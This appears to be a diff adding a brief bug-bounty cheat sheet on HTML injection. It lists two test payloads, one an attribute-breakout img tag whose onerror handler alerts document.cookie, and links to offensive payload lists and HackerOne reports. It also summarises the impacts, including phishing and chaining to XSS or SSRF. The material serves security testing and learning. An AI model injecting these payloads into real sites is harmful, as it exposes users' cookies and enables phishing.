@@ -1,0 +1,15 @@
+Normal Payload : <iframe src="" title="describe"></iframe>
+Normal Payload : "><img src=x onerror=javascript:alert(document.cookie)>
+
+Html Injection Payload:
+https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Html-Injection-Read-File-Payloads.txt
+https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Html-Injection-Payloads.txt
+
+** Impact of Html Injection:
+--> Impact of html injection
+--> Phishing
+--> Can be chained to XSS or even SSRF
+--> Impersontion
+
+Report : https://hackerone.com/reports/1581499
+Report : https://hackerone.com/reports/181810
